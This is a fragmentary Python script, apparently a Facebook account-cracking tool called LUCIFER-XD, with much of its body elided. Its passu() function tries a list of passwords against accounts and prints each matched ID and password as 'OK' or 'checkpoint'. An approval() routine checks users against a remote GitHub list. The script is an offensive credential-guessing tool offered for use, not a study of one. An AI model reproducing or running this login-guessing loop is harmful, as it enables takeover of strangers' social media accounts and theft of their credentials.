...
Y88888P ~Y8888P'  `Y88P' Y888888P YP      Y88888P\u001b[36mv1""")
def info():
	print(f"""\033[1;37m----------------------------------------------
 Author     : DIWASH
 Github     :[-ERROR-]
...
def modules():
	...
	time.sleep(1)##TERO DAI KO SOURCE CODE
#KAA BATA CHORAIS
...
def passu():
	...
	linex()
	prog = Progress(TextColumn('\033[1;97m [LUCIFER-XD]{task.description}'))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\u001b[33m [LUCIFER-CP] {idf} │ {pw}\033[1;97m')
				...
				print(f'\033[1;32m [LUCIFER-OK] {idf} │ {pw}\033[1;97m')
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/LUCIFERtamang/approval.txt/main/Approval.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://www.facebook.com/profile.php?id=100074543171240')
      time.sleep(1)
      exit()
  except: 
